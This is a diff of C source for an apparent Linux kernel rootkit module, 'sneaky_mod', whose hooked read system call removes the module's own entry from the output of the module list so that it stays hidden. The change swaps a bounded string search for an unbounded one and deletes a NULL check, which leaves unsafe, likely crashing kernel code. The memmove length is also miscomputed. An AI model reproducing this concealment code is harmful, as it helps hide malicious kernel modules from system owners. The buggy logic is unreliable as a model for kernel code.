@@ -104,20 +104,16 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
 
   
   char * original_buf = (char *) regs->si;
-  char * sneaky_mod_buf = strnstr(original_buf, "sneaky_mod 16384 0 - Live 0x0000000000000000 (OE)", original_result);
+  char * sneaky_mod_buf = strstr(original_buf, "sneaky_mod 16384 0 - Live 0x0000000000000000 (OE)\n");
   
   if( sneaky_mod_buf != NULL){
     char * after_sneaky_mod_buf = strchr(sneaky_mod_buf, '\n');
-    if(after_sneaky_mod_buf != NULL){
 
       ssize_t line_size = after_sneaky_mod_buf - sneaky_mod_buf + 1;
       ssize_t sneaky_result = original_result - line_size;
       memmove(sneaky_mod_buf, after_sneaky_mod_buf + 1, original_result - line_size);
       return sneaky_result;
-    }
-    else{
-      return original_result;
-    }
+
   }
   else{
     return original_result;
